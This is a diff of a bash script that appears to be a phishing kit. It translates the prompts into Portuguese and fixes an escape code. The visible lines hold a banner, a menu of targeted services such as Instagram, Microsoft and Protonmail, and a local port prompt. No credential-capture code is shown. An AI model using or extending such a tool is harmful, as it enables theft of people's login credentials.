@@ -18,7 +18,7 @@ printf "\e[1;77m ╚════██║██║   ██║██║     █�
 printf "\e[1;77m ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗██║     ██║  ██║██║███████║██║  ██║ \e[0m\n"
 printf "\e[1;77m ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
 printf "\n"
-printf "\e[1;93m\e[0m\e[1;77m SOCIAL TOOL DESEKVOLVIDO POR @LEO MODZ OFC\e[0m\e[1;93\e[0m\n"
+printf "\e[1;93m\e[0m\e[1;77m SOCIAL TOOL DESEKVOLVIDO POR @LEO MODZ OFC\e[0m\e[1;93m.\e[0m\n"
 printf "\n"
 }
 
@@ -40,7 +40,7 @@ printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       
 printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m         \n"
 printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m     \n"
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m \n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma opção: \e[0m\en' option
 
 if [[ $option == 1 || $option == 01 ]]; then
 server="instagram"
@@ -345,7 +345,7 @@ start() {
 
 default_port="8080"
 defaultlink="localhost"
-printf '\e[1;92m[\e[0m*\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+printf '\e[1;92m[\e[0m*\e[1;92m] Escolha uma porta (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 
 read port
 port="${port:-${default_port}}"
